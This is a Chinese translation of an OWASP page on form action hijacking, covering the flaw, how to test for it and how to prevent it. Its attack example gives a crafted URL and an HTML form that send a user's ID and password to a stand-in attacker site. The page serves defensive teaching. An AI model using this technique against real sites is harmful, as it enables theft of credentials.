[TOC]

*最新版本 (mm/dd/yy): 09/12/2017*

翻译自[Form action hijacking](https://www.owasp.org/index.php/Form_action_hijacking "Form action hijacking")

# 概览
表单行为劫持允许攻击者通过参数指定表单的动作URL。攻击者可以构造一个URL来修改表单的动作URL以指向攻击者的服务器。表单的内容，包括跨站请求令牌，用户输入的参数值，和其他所有的内容将通过被劫持的URL被传送到攻击者。

# 如何测试表单行为劫持漏洞
检查传递给表单操作的参数值。 参见下面的例子。

# 如何防止表单操作劫持漏洞
对表单操作网址进行硬编码或使用允许的网址的白名单。

# 攻击示例
以下网址会生成一个表单，并将“url”参数设置为来自操作网址。 提交表单时，ID和密码将发送到攻击者的网站。
URL：
`https://vulnerablehost.com/?url=https://attackersite.com`
源码

```html
<form name="form1" id="form1" method="post" action="https://attackersite.com">
    <input type="text" name="id" value="user name">
    <input type="password" name="pass" value="password">
    <input type="submit" name="submit" value="Submit">
</form>
```

# 参考

- [常见的弱点枚举 - CWE-20：输入验证不正确](https://cwe.mitre.org/data/definitions/20.html "常见的弱点枚举 - CWE-20：输入验证不正确")
- [PortSwigger：表单行为劫持（反射型）](https://portswigger.net/knowledgebase/issues/details/00501500_formactionhijackingreflected "PortSwigger：表单行为劫持（反射型）")
- [PortSwigger：表单行为劫持（存储型）](https://portswigger.net/knowledgebase/issues/details/00501501_formactionhijackingstored "PortSwigger：表单行为劫持（存储型）")